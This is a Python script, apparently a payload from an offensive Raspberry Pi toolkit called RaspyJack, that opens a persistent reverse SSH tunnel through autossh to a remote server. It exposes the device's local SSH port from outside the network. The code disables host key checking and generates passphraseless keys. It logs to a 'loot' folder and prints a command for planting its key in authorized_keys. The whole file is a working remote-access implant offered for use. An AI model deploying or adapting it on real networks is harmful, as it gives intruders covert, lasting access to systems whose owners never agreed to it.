#!/usr/bin/env python3
# @name: Persistent Reverse SSH Tunnel
# @desc: Establishes a persistent reverse SSH tunnel using autossh with automatic reconnection.
# @category: remote_access
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Persistent Reverse SSH Tunnel
===================================================
Author: 7h30th3r0n3

Establishes a persistent reverse SSH tunnel using autossh with
automatic reconnection. Config stored in JSON.

Setup / Prerequisites:
  - Requires autossh: apt install autossh
  - Edit config at $CITYPOP_ROOT/config/reverse_ssh/config.json with
    remote_host, remote_user.
  - Generate SSH key with KEY2, then add the public key to the
    remote server's authorized_keys.

Controls:
  usage: reverse_ssh.py start [duration_seconds]
         reverse_ssh.py stop
         reverse_ssh.py status
         reverse_ssh.py test
         reverse_ssh.py keygen
         reverse_ssh.py config [--host H] [--port P] [--user U]
                                [--local-port P] [--key PATH]
    config with no flags prompts interactively for each field.

Config: $CITYPOP_ROOT/config/reverse_ssh/config.json
  Fields: remote_host, remote_port, remote_user, ssh_key_path,
          local_forward_port
"""

from payloads._web_input import request_input
import os
import sys
import time
import json
import subprocess
import threading
import signal
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'ReverseSSH')
CONFIG_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'config', 'reverse_ssh')
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
KEY_DIR = os.path.join(CONFIG_DIR, "keys")

os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)
os.makedirs(KEY_DIR, exist_ok=True)

DEFAULT_CONFIG = {
    "remote_host": "your.server.com",
    "remote_port": 2222,
    "remote_user": "tunnel",
    "ssh_key_path": os.path.join(KEY_DIR, "id_rsa_tunnel"),
    "local_forward_port": 22,
}

# Presets for cycling through values
HOST_PRESETS = [
    "your.server.com",
    "192.168.1.100",
    "10.0.0.1",
    "vps.example.com",
]

USER_PRESETS = ["tunnel", "root", "pi", "admin", "deploy"]
PORT_MIN = 1024
PORT_MAX = 65535

# Config field ordering for UI navigation
CONFIG_FIELDS = [
    "remote_host",
    "remote_port",
    "remote_user",
    "ssh_key_path",
    "local_forward_port",
]

FIELD_LABELS = {
    "remote_host": "Host",
    "remote_port": "R.Port",
    "remote_user": "User",
    "ssh_key_path": "Key",
    "local_forward_port": "L.Port",
}

# ---------------------------------------------------------------------------
# Thread-safe state
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "config": dict(DEFAULT_CONFIG),
    "selected_field": 0,
    "tunnel_status": "disconnected",  # connecting, connected, disconnected
    "tunnel_running": False,
    "uptime_start": None,
    "last_message": "",
    "autossh_proc": None,
}


def _get_state():
    with _lock:
        return {
            "config": dict(_state["config"]),
            "selected_field": _state["selected_field"],
            "tunnel_status": _state["tunnel_status"],
            "tunnel_running": _state["tunnel_running"],
            "uptime_start": _state["uptime_start"],
            "last_message": _state["last_message"],
        }


def _set_state(**kwargs):
    with _lock:
        for k, v in kwargs.items():
            _state[k] = v


def _get_proc():
    with _lock:
        return _state["autossh_proc"]


def _set_proc(proc):
    with _lock:
        _state["autossh_proc"] = proc


# ---------------------------------------------------------------------------
# Config persistence
# ---------------------------------------------------------------------------
def _load_config():
    """Load config from JSON file or create default."""
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                loaded = json.load(f)
            # Merge with defaults for any missing keys
            merged = {**DEFAULT_CONFIG, **loaded}
            _set_state(config=merged)
            return
        except (json.JSONDecodeError, PermissionError):
            pass
    _set_state(config=dict(DEFAULT_CONFIG))
    _save_config()


def _save_config():
    """Persist current config to JSON."""
    st = _get_state()
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(st["config"], f, indent=2)
    except Exception:
        _set_state(last_message="Save failed!")


# ---------------------------------------------------------------------------
# SSH keypair generation
# ---------------------------------------------------------------------------
def _generate_keypair():
    """Generate a new SSH keypair for the tunnel."""
    _set_state(last_message="Generating key...")
    st = _get_state()
    key_path = st["config"]["ssh_key_path"]

    # Remove existing keys to avoid interactive prompt
    for suffix in ["", ".pub"]:
        path = key_path + suffix
        if os.path.isfile(path):
            os.remove(path)

    try:
        result = subprocess.run(
            [
                "ssh-keygen",
                "-t", "rsa",
                "-b", "4096",
                "-f", key_path,
                "-N", "",  # no passphrase
                "-C", "raspyjack-tunnel",
            ],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            _set_state(last_message="Key generated!")
            # Log the public key path for easy deployment
            pub_path = key_path + ".pub"
            if os.path.isfile(pub_path):
                with open(pub_path, "r") as f:
                    pub_key = f.read().strip()
                log_path = os.path.join(LOOT_DIR, "public_key.txt")
                with open(log_path, "w") as f:
                    f.write(pub_key + "\n")
                    f.write(f"\n# Add to remote authorized_keys:\n")
                    f.write(f"# echo '{pub_key}' >> ~/.ssh/authorized_keys\n")
        else:
            _set_state(last_message=f"Keygen err: {result.stderr[:20]}")
    except FileNotFoundError:
        _set_state(last_message="ssh-keygen not found")
    except Exception as exc:
        _set_state(last_message=f"Error: {str(exc)[:18]}")


# ---------------------------------------------------------------------------
# Connection test
# ---------------------------------------------------------------------------
def _test_connection():
    """Test SSH connectivity to remote host."""
    _set_state(last_message="Testing...")

    st = _get_state()
    cfg = st["config"]

    cmd = [
        "ssh",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=10",
        "-o", "StrictHostKeyChecking=no",
        "-p", "22",
    ]

    key_path = cfg["ssh_key_path"]
    if os.path.isfile(key_path):
        cmd.extend(["-i", key_path])

    cmd.extend([
        f"{cfg['remote_user']}@{cfg['remote_host']}",
        "echo", "ok",
    ])

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            _set_state(last_message="Connection OK!")
        else:
            err = result.stderr.strip().split("\n")[-1] if result.stderr else "Failed"
            _set_state(last_message=f"Fail: {err[:18]}")
    except subprocess.TimeoutExpired:
        _set_state(last_message="Timeout (10s)")
    except FileNotFoundError:
        _set_state(last_message="ssh not found!")
    except Exception as exc:
        _set_state(last_message=f"Err: {str(exc)[:18]}")


# ---------------------------------------------------------------------------
# Tunnel management
# ---------------------------------------------------------------------------
def _start_tunnel():
    """Start autossh reverse tunnel."""
    if _get_state()["tunnel_running"]:
        return

    _set_state(
        tunnel_status="connecting",
        tunnel_running=True,
        last_message="Starting tunnel...",
    )

    thread = threading.Thread(target=_tunnel_worker, daemon=True)
    thread.start()


def _tunnel_worker():
    """Background worker that runs autossh."""
    st = _get_state()
    cfg = st["config"]

    cmd = [
        "autossh",
        "-M", "0",
        "-o", "ServerAliveInterval 30",
        "-o", "ServerAliveCountMax 3",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ExitOnForwardFailure=yes",
        "-N",
        "-R", f"{cfg['remote_port']}:localhost:{cfg['local_forward_port']}",
        f"{cfg['remote_user']}@{cfg['remote_host']}",
    ]

    key_path = cfg["ssh_key_path"]
    if os.path.isfile(key_path):
        cmd.extend(["-i", key_path])

    env = dict(os.environ)
    env["AUTOSSH_GATETIME"] = "0"
    env["AUTOSSH_POLL"] = "30"

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
        )
        _set_proc(proc)
        _set_state(
            tunnel_status="connected",
            uptime_start=time.time(),
            last_message="Tunnel active",
        )

        # Log tunnel start
        _log_event("tunnel_started", cfg)

        # Wait for process to exit
        proc.wait()

        exit_code = proc.returncode
        _set_state(
            tunnel_status="disconnected",
            tunnel_running=False,
            uptime_start=None,
            last_message=f"Tunnel exited ({exit_code})",
        )
        _set_proc(None)

    except FileNotFoundError:
        _set_state(
            tunnel_status="disconnected",
            tunnel_running=False,
            last_message="autossh not found!",
        )
        _set_proc(None)
    except Exception as exc:
        _set_state(
            tunnel_status="disconnected",
            tunnel_running=False,
            last_message=f"Err: {str(exc)[:18]}",
        )
        _set_proc(None)


def _stop_tunnel():
    """Stop the running autossh tunnel."""
    proc = _get_proc()
    if proc is not None:
        _set_state(last_message="Stopping tunnel...")
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
        except Exception:
            pass
        _set_proc(None)

    _set_state(
        tunnel_status="disconnected",
        tunnel_running=False,
        uptime_start=None,
        last_message="Tunnel stopped",
    )
    _log_event("tunnel_stopped", {})


def _log_event(event_type, details):
    """Append event to log file."""
    log_path = os.path.join(LOOT_DIR, "tunnel_log.jsonl")
    entry = {
        "timestamp": datetime.now().isoformat(),
        "event": event_type,
        "details": details,
    }
    try:
        with open(log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Field editing
# ---------------------------------------------------------------------------
def _find_key_files():
    """Find SSH key files in the key directory and common locations."""
    paths = []
    search_dirs = [KEY_DIR, os.path.expanduser("~/.ssh")]
    for d in search_dirs:
        if os.path.isdir(d):
            for fname in sorted(os.listdir(d)):
                fpath = os.path.join(d, fname)
                if (
                    os.path.isfile(fpath)
                    and not fname.endswith(".pub")
                    and not fname.endswith(".txt")
                    and "known_hosts" not in fname
                    and "config" not in fname
                ):
                    paths.append(fpath)
    return paths if paths else [DEFAULT_CONFIG["ssh_key_path"]]


# ---------------------------------------------------------------------------
# Uptime formatting
# ---------------------------------------------------------------------------
def _format_uptime(start_time):
    """Return human-readable uptime string."""
    if start_time is None:
        return "0s"
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    if hours > 0:
        return f"{hours}h{minutes}m{seconds}s"
    elif minutes > 0:
        return f"{minutes}m{seconds}s"
    return f"{seconds}s"


# ---------------------------------------------------------------------------
# CLI helpers
# ---------------------------------------------------------------------------
USAGE = (
    "Usage:\n"
    "  reverse_ssh.py start [duration_seconds]\n"
    "  reverse_ssh.py stop\n"
    "  reverse_ssh.py status\n"
    "  reverse_ssh.py test\n"
    "  reverse_ssh.py keygen\n"
    "  reverse_ssh.py config [--host H] [--port P] [--user U] "
    "[--local-port P] [--key PATH]\n"
    "      (config with no flags prompts interactively for each field)"
)

FLAG_MAP = {
    "--host": "remote_host",
    "--port": "remote_port",
    "--user": "remote_user",
    "--local-port": "local_forward_port",
    "--key": "ssh_key_path",
}


def _print_config():
    st = _get_state()
    cfg = st["config"]
    for field in CONFIG_FIELDS:
        print(f"  {FIELD_LABELS[field]}: {cfg[field]}", flush=True)


def _prompt_choice(label, current, presets):
    """Numbered prompt for a preset-backed field; blank keeps current."""
    print(f"{label} (current: {current})", flush=True)
    for i, p in enumerate(presets, 1):
        print(f"  {i}. {p}", flush=True)
    raw = request_input("Select number, type a custom value, or press Enter to keep: ").strip()
    if not raw:
        return current
    if raw.isdigit():
        idx = int(raw)
        if 1 <= idx <= len(presets):
            return presets[idx - 1]
    return raw


def _prompt_port(label, current):
    while True:
        raw = request_input(f"{label} [{current}]: ").strip()
        if not raw:
            return current
        try:
            val = int(raw)
        except ValueError:
            print("Enter a number.", flush=True)
            continue
        if PORT_MIN <= val <= PORT_MAX:
            return val
        print(f"Port must be between {PORT_MIN} and {PORT_MAX}.", flush=True)


def _config_interactive():
    st = _get_state()
    cfg = dict(st["config"])
    cfg["remote_host"] = _prompt_choice("Remote host", cfg["remote_host"], HOST_PRESETS)
    cfg["remote_user"] = _prompt_choice("Remote user", cfg["remote_user"], USER_PRESETS)
    cfg["remote_port"] = _prompt_port("Remote port", cfg["remote_port"])
    cfg["local_forward_port"] = _prompt_port("Local forward port", cfg["local_forward_port"])
    cfg["ssh_key_path"] = _prompt_choice(
        "SSH key path", cfg["ssh_key_path"], _find_key_files(),
    )
    _set_state(config=cfg)
    _save_config()
    print("Config saved.", flush=True)
    _print_config()


def _config_from_args(args):
    st = _get_state()
    cfg = dict(st["config"])
    i = 0
    while i < len(args):
        flag = args[i]
        if flag not in FLAG_MAP or i + 1 >= len(args):
            print(USAGE, flush=True)
            sys.exit(1)
        field = FLAG_MAP[flag]
        value = args[i + 1]
        if field in ("remote_port", "local_forward_port"):
            try:
                value = int(value)
            except ValueError:
                print(f"{flag} requires a numeric port", flush=True)
                sys.exit(1)
        cfg[field] = value
        i += 2
    _set_state(config=cfg)
    _save_config()
    print("Config saved.", flush=True)
    _print_config()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    _load_config()

    args = sys.argv[1:]
    if not args:
        print(USAGE, flush=True)
        return 1

    action = args[0]

    if action == "status":
        st = _get_state()
        print(f"Tunnel status: {st['tunnel_status']}", flush=True)
        print(f"Uptime: {_format_uptime(st['uptime_start'])}", flush=True)
        _print_config()
        return 0

    if action == "config":
        if len(args) > 1:
            _config_from_args(args[1:])
        else:
            _config_interactive()
        return 0

    if action == "keygen":
        _generate_keypair()
        print(_get_state()["last_message"], flush=True)
        return 0

    if action == "test":
        _test_connection()
        print(_get_state()["last_message"], flush=True)
        return 0

    if action == "stop":
        _stop_tunnel()
        print("Tunnel stopped.", flush=True)
        return 0

    if action == "start":
        duration = None
        if len(args) > 1:
            try:
                duration = float(args[1])
            except ValueError:
                print(f"Usage: {sys.argv[0]} start [duration_seconds]", flush=True)
                return 1

        cfg = _get_state()["config"]
        print(
            f"Starting reverse SSH tunnel to "
            f"{cfg['remote_user']}@{cfg['remote_host']}:{cfg['remote_port']} "
            f"-> localhost:{cfg['local_forward_port']}", flush=True,
        )
        _start_tunnel()

        start_time = time.time()
        try:
            while True:
                time.sleep(5)
                st = _get_state()
                elapsed = int(time.time() - start_time)
                print(
                    f"[{elapsed}s] status={st['tunnel_status']} "
                    f"uptime={_format_uptime(st['uptime_start'])} "
                    f"msg={st['last_message']}", flush=True,
                )
                if not st["tunnel_running"]:
                    break
                if duration and elapsed >= duration:
                    break
        except KeyboardInterrupt:
            print("\n[*] Stopping...", flush=True)
        finally:
            _stop_tunnel()

        print("Tunnel session ended.", flush=True)
        return 0

    print(USAGE, flush=True)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
